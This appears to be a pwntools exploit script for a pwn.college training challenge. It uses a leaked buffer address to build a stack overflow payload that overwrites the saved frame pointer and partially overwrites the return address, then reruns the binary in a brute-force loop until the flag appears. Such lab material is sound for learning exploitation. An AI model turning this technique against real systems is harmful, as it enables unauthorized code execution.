#!/bin/python

from pwn import * 
import sys
import time

context.arch = 'amd64'
context.log_level  = 'error'

FUNC_NAME="challenge"
BUFFER_LEN= 0xa0 - 8

elf = None
rop = None
libc = None

done = False

def get_payload(args, proc: process):
    global elf, rop, libc, done
    
#    elf = proc.elf 
#    rop = ROP(elf)
#    libc = elf.libc
    
#    import IPython; IPython.embed()

    proc.recvuntil(b"[LEAK] Your input buffer is located at: 0x")
    leak_addr = int(proc.recvline(drop=True)[:-1], 16)

    return flat([
            b'X' * BUFFER_LEN,
            leak_addr - 16,
            p32(0x578c8)[:-1]
    ])

def main():
    count = 0
    while True:
        print(str(count) + " ", end='')
        count += 1

        proc = process(sys.argv[1])
        proc.send(get_payload(None, proc))

#        time.sleep(0.1)
        try:
            proc.recvuntil(b'pwn.college')
            print(proc.recvline())
            break
        except:
            pass



if __name__ == '__main__':
    main()
